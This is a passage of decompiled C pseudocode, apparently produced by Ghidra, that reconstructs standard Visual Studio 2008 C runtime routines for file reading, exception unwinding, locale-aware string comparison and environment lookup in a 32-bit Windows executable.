          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_14 = (short *)((int)local_14 + (int)local_10);
        _MaxCharCount = (uint)local_10;
        psVar8 = local_10;
        if (local_10 < local_14) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar8 = *(undefined *)_MaxCharCount;
                psVar8 = (short *)((int)psVar8 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_14 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_00411291;
                }
LAB_00411308:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar8 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_00411308;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar8 == local_10) && (local_5 == '\n')) goto LAB_00411291;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_0041130c;
                  goto LAB_00411308;
                }
                if (local_5 == '\n') {
LAB_00411291:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar8 = 10;
                }
                else {
                  *(undefined *)psVar8 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar8 = cVar4;
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_0041130c:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_14);
        }
        local_14 = (short *)((int)psVar8 - (int)local_10);
        if ((local_6 != '\x01') || (local_14 == (short *)0x0)) goto LAB_00411411;
        bVar3 = *(byte *)(short *)((int)psVar8 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar8 = (short *)((int)psVar8 + -1);
          while ((((&DAT_00418f20)[bVar3] == '\0' && (iVar13 < 5)) && (local_10 <= psVar8))) {
            psVar8 = (short *)((int)psVar8 + -1);
            bVar3 = *(byte *)psVar8;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_00418f20)[*(byte *)psVar8] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_0041140d;
          }
          if ((char)(&DAT_00418f20)[*(byte *)psVar8] + 1 == iVar13) {
            psVar8 = (short *)((int)psVar8 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar12 = (short *)((int)psVar8 + 1);
            *(byte *)(*piVar6 + iVar14 + 5) = *(byte *)psVar8;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar12;
              psVar12 = psVar8 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar12;
              psVar12 = (short *)((int)psVar12 + 1);
            }
            psVar8 = (short *)((int)psVar12 - iVar13);
          }
        }
        iVar13 = (int)psVar8 - (int)local_10;
        local_14 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_14 != (short *)0x0) {
          bVar15 = local_14 != (short *)iVar13;
          local_14 = (short *)((int)local_14 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_00411411;
        }
        uVar11 = GetLastError();
LAB_00411406:
        __dosmaperr(uVar11);
      }
LAB_0041140d:
      local_18 = -1;
LAB_00411411:
      if (local_10 != (short *)_DstBuf) {
        _free(local_10);
      }
      if (local_18 == -2) {
        return (int)local_14;
      }
      return local_18;
    }
  }
LAB_004110f2:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_00411104:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2008 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041b2c4)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_004116af();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_0041160b;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_0041160b:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



void FUN_004116af(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x4116d4,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_004116dc;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_004117f0();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00419028 = param_1;
  DAT_00419024 = in_EAX;
  DAT_0041902c = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00419028 = param_1;
  DAT_00419024 = in_EAX;
  DAT_0041902c = unaff_EBP;
  return;
}



void FUN_004117f0(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2008 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  _PHNDLR p_Var2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if ((DAT_00419030 & 1) != 0) {
    __NMSG_WRITE(10);
  }
  p_Var2 = ___get_sigabrt();
  if (p_Var2 != (_PHNDLR)0x0) {
    _raise(0x16);
  }
  if ((DAT_00419030 & 2) != 0) {
    local_2d4 = 0x10001;
    _memset(&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  ___ansicp
// 
// Library: Visual Studio 2008 Release

void __cdecl ___ansicp(LCID param_1)

{
  int iVar1;
  CHAR local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,local_10,6);
  if (iVar1 != 0) {
    _atol(local_10);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___convertcp
// 
// Library: Visual Studio 2008 Release

void __cdecl
___convertcp(UINT param_1,UINT param_2,char *param_3,uint *param_4,LPSTR param_5,int param_6)

{
  uint _Size;
  uint cbMultiByte;
  bool bVar1;
  BOOL BVar2;
  size_t sVar3;
  undefined4 *puVar4;
  int iVar5;
  LPSTR lpMultiByteStr;
  uint uVar6;
  bool bVar7;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_4;
  bVar1 = false;
  if (param_1 == param_2) goto LAB_00411af5;
  BVar2 = GetCPInfo(param_1,&local_1c);
  if ((((BVar2 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar2 = GetCPInfo(param_2,&local_1c), BVar2 == 0)) || (local_1c.MaxCharSize != 1)) {
    uVar6 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = uVar6 == 0;
    if (bVar7) goto LAB_00411af5;
  }
  else {
    bVar1 = true;
    uVar6 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      sVar3 = _strlen(param_3);
      uVar6 = sVar3 + 1;
    }
    bVar7 = uVar6 == 0;
  }
  if ((bVar7 || (int)uVar6 < 0) || (0x7ffffff0 < uVar6)) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    _Size = uVar6 * 2 + 8;
    if (_Size < 0x401) {
      puVar4 = (undefined4 *)&stack0xffffffbc;
      local_20 = (undefined4 *)&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_00411a35:
        local_20 = puVar4 + 2;
      }
    }
    else {
      puVar4 = (undefined4 *)_malloc(_Size);
      local_20 = puVar4;
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = 0xdddd;
        goto LAB_00411a35;
      }
    }
  }
  if (local_20 != (undefined4 *)0x0) {
    _memset(local_20,0,uVar6 * 2);
    iVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)local_20,uVar6);
    if (iVar5 != 0) {
      if (param_5 == (LPSTR)0x0) {
        if (((bVar1) ||
            (uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,(LPSTR)0x0,0,(LPCSTR)0x0,
                                         (LPBOOL)0x0), uVar6 != 0)) &&
           (lpMultiByteStr = (LPSTR)__calloc_crt(1,uVar6), lpMultiByteStr != (LPSTR)0x0)) {
          uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,lpMultiByteStr,uVar6,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (uVar6 == 0) {
            _free(lpMultiByteStr);
          }
          else if (cbMultiByte != 0xffffffff) {
            *param_4 = uVar6;
          }
        }
      }
      else {
        WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,param_5,param_6,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    __freea(local_20);
  }
LAB_00411af5:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2008 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __strnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __strnicmp_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    iVar2 = 0;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
    if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
    else if (_MaxCount < 0x80000000) {
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
      }
      else {
        do {
          iVar2 = __tolower_l((uint)(byte)*_Str1,&local_14);
          _Str1 = _Str1 + 1;
          iVar3 = __tolower_l((uint)(byte)*_Str2,&local_14);
          _Str2 = (char *)((byte *)_Str2 + 1);
          _MaxCount = _MaxCount - 1;
          if ((_MaxCount == 0) || (iVar2 == 0)) break;
        } while (iVar2 == iVar3);
        iVar2 = iVar2 - iVar3;
      }
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
    else {
      piVar1 = __errno();
      *piVar1 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2008 Release

void __cdecl ___initconout(void)

{
  DAT_00419044 = CreateFileA("CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int __cdecl FUN_00411cf1(FILE *param_1)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (param_1 == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
  else if ((*(byte *)&param_1->_flag & 0x40) == 0) {
    __lock_file(param_1);
    local_20 = __fclose_nolock(param_1);
    FUN_00411d65();
  }
  else {
    param_1->_flag = 0;
  }
  return local_20;
}



void FUN_00411d65(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2008 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041b2c4)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_0041b2e0)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_0041b2e0)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_00411e2f;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_00411e2f:
        FUN_00411e44();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00411e44(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  int __cdecl strncnt(char const *,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl strncnt(char *param_1,int param_2)

{
  char *in_EAX;
  char *pcVar1;
  
  pcVar1 = param_1;
  for (; (pcVar1 != (char *)0x0 && (*in_EAX != '\0')); in_EAX = in_EAX + 1) {
    pcVar1 = pcVar1 + -1;
  }
  return (int)(param_1 + (-1 - (int)(pcVar1 + -1)));
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtCompareStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char const *,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtCompareStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8)

{
  uint _Size;
  char *lpMultiByteStr;
  int iVar1;
  DWORD DVar2;
  BOOL BVar3;
  BYTE *pBVar4;
  uint cchWideChar;
  uint uVar5;
  undefined4 *puVar6;
  char *pcVar7;
  int *in_ECX;
  byte *in_EDX;
  byte *_Memory;
  int unaff_EDI;
  PCNZCH _Memory_00;
  byte *local_28;
  undefined4 *local_24;
  char *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  lpMultiByteStr = param_4;
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  local_20 = param_4;
  if (DAT_00419f30 == 0) {
    iVar1 = CompareStringW(0,0,L"",1,L"",1);
    if (iVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_00419f30 = 2;
      }
    }
    else {
      DAT_00419f30 = 1;
    }
  }
  if ((int)param_3 < 1) {
    if ((int)param_3 < -1) goto LAB_004121ca;
  }
  else {
    param_3 = strncnt((char *)param_3,unaff_EDI);
  }
  if (param_5 < 1) {
    if (param_5 < -1) goto LAB_004121ca;
  }
  else {
    param_5 = strncnt((char *)param_5,unaff_EDI);
  }
  if ((DAT_00419f30 == 2) || (DAT_00419f30 == 0)) {
    _Memory_00 = (PCNZCH)0x0;
    _Memory = (byte *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_6 == (char *)0x0) {
      param_6 = *(char **)(*in_ECX + 4);
    }
    pcVar7 = (char *)___ansicp((LCID)param_1);
    if (pcVar7 == (char *)0xffffffff) goto LAB_004121ca;
    local_28 = in_EDX;
    if (pcVar7 != param_6) {
      _Memory = (byte *)___convertcp((UINT)param_6,(UINT)pcVar7,(char *)in_EDX,&param_3,(LPSTR)0x0,0
                                    );
      if (_Memory == (byte *)0x0) goto LAB_004121ca;
      _Memory_00 = (PCNZCH)___convertcp((UINT)param_6,(UINT)pcVar7,lpMultiByteStr,(uint *)&param_5,
                                        (LPSTR)0x0,0);
      local_28 = _Memory;
      local_20 = _Memory_00;
      if (_Memory_00 == (PCNZCH)0x0) {
        _free(_Memory);
        goto LAB_004121ca;
      }
    }
    CompareStringA((LCID)param_1,param_2,(PCNZCH)local_28,param_3,local_20,param_5);
    if (_Memory != (byte *)0x0) {
      _free(_Memory);
      _free(_Memory_00);
    }
    goto LAB_004121ca;
  }
  if (DAT_00419f30 != 1) goto LAB_004121ca;
  if (param_6 == (char *)0x0) {
    param_6 = *(char **)(*in_ECX + 4);
  }
  if ((param_3 == 0) || (param_5 == 0)) {
    if ((param_3 == param_5) ||
       (((1 < param_5 || (1 < (int)param_3)) ||
        (BVar3 = GetCPInfo((UINT)param_6,&local_1c), BVar3 == 0)))) goto LAB_004121ca;
    if (0 < (int)param_3) {
      if (1 < local_1c.MaxCharSize) {
        pBVar4 = local_1c.LeadByte;
        while (((local_1c.LeadByte[0] != 0 && (pBVar4[1] != 0)) &&
               ((*in_EDX < *pBVar4 || (pBVar4[1] < *in_EDX))))) {
          pBVar4 = pBVar4 + 2;
          local_1c.LeadByte[0] = *pBVar4;
        }
      }
      goto LAB_004121ca;
    }
    if (0 < param_5) {
      if (1 < local_1c.MaxCharSize) {
        pBVar4 = local_1c.LeadByte;
        while (((local_1c.LeadByte[0] != 0 && (pBVar4[1] != 0)) &&
               (((byte)*lpMultiByteStr < *pBVar4 || (pBVar4[1] < (byte)*lpMultiByteStr))))) {
          pBVar4 = pBVar4 + 2;
          local_1c.LeadByte[0] = *pBVar4;
        }
      }
      goto LAB_004121ca;
    }
  }
  cchWideChar = MultiByteToWideChar((UINT)param_6,9,(LPCSTR)in_EDX,param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_004121ca;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_24 = (undefined4 *)0x0;
  }
  else {
    uVar5 = cchWideChar * 2 + 8;
    if (uVar5 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffc4;
      local_24 = (undefined4 *)&stack0xffffffc4;
      if (&stack0x00000000 != (undefined *)0x3c) {
LAB_00412043:
        local_24 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar5);
      local_24 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_00412043;
      }
    }
  }
  if (local_24 == (undefined4 *)0x0) goto LAB_004121ca;
  iVar1 = MultiByteToWideChar((UINT)param_6,1,(LPCSTR)in_EDX,param_3,(LPWSTR)local_24,cchWideChar);
  if ((iVar1 != 0) &&
     (uVar5 = MultiByteToWideChar((UINT)param_6,9,lpMultiByteStr,param_5,(LPWSTR)0x0,0), uVar5 != 0)
     ) {
    if (((int)uVar5 < 1) || (0xffffffe0 / uVar5 < 2)) {
      puVar6 = (undefined4 *)0x0;
    }
    else {
      _Size = uVar5 * 2 + 8;
      if (_Size < 0x401) {
        if (&stack0x00000000 == (undefined *)0x3c) goto LAB_00412104;
        puVar6 = (undefined4 *)&stack0xffffffcc;
      }
      else {
        puVar6 = (undefined4 *)_malloc(_Size);
        if (puVar6 != (undefined4 *)0x0) {
          *puVar6 = 0xdddd;
          puVar6 = puVar6 + 2;
        }
      }
    }
    if (puVar6 != (undefined4 *)0x0) {
      iVar1 = MultiByteToWideChar((UINT)param_6,1,lpMultiByteStr,param_5,(LPWSTR)puVar6,uVar5);
      if (iVar1 != 0) {
        CompareStringW((LCID)param_1,param_2,(PCNZWCH)local_24,cchWideChar,(PCNZWCH)puVar6,uVar5);
      }
      __freea(puVar6);
    }
  }
LAB_00412104:
  __freea(local_24);
LAB_004121ca:
  iVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar1;
}



// Library Function - Single Match
//  ___crtCompareStringA
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtCompareStringA
          (_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwCmpFlags,LPCSTR _LpString1,
          int _CchCount1,LPCSTR _LpString2,int _CchCount2,int _Code_page)

{
  int iVar1;
  int in_stack_ffffffec;
  int in_stack_fffffff0;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtCompareStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwCmpFlags,_CchCount1,_LpString2,_CchCount2,
                     (char *)_Code_page,in_stack_ffffffec,in_stack_fffffff0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  __strnicoll_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __strnicoll_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  LPCWSTR _LocaleName;
  int *piVar1;
  int iVar2;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_MaxCount == 0) {
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0x7fffffff;
  }
  if (_MaxCount < 0x80000000) {
    _LocaleName = (LPCWSTR)(local_14.locinfo)->lc_category[0].locale;
    if (_LocaleName == (LPCWSTR)0x0) {
      iVar2 = __strnicmp_l(_Str1,_Str2,_MaxCount,&local_14);
    }
    else {
      iVar2 = ___crtCompareStringA
                        (&local_14,_LocaleName,0x1001,_Str1,_MaxCount,_Str2,_MaxCount,
                         (local_14.locinfo)->lc_collate_cp);
      if (iVar2 == 0) {
        piVar1 = __errno();
        *piVar1 = 0x16;
        goto LAB_004122f5;
      }
      iVar2 = iVar2 + -2;
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
LAB_004122f5:
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar2 = 0x7fffffff;
  }
  return iVar2;
}



// Library Function - Single Match
//  _findenv
// 
// Library: Visual Studio 2008 Release

int __cdecl _findenv(uchar *param_1)

{
  int iVar1;
  uchar **ppuVar2;
  size_t unaff_EDI;
  
  ppuVar2 = DAT_004196c4;
  while( true ) {
    if (*ppuVar2 == (uchar *)0x0) {
      return -((int)ppuVar2 - (int)DAT_004196c4 >> 2);
    }
    iVar1 = __mbsnbicoll(param_1,*ppuVar2,unaff_EDI);
    if ((iVar1 == 0) && (((*ppuVar2)[unaff_EDI] == '=' || ((*ppuVar2)[unaff_EDI] == '\0')))) break;
    ppuVar2 = ppuVar2 + 1;
  }
  return (int)ppuVar2 - (int)DAT_004196c4 >> 2;
}



// Library Function - Single Match
//  _copy_environ
// 
// Library: Visual Studio 2008 Release

char ** _copy_environ(void)

{
  char **in_EAX;
  char **ppcVar1;
  char *pcVar2;
  char **ppcVar3;
  
  ppcVar1 = (char **)0x0;
  if (in_EAX != (char **)0x0) {
    pcVar2 = *in_EAX;
    ppcVar3 = in_EAX;
    while (pcVar2 != (char *)0x0) {
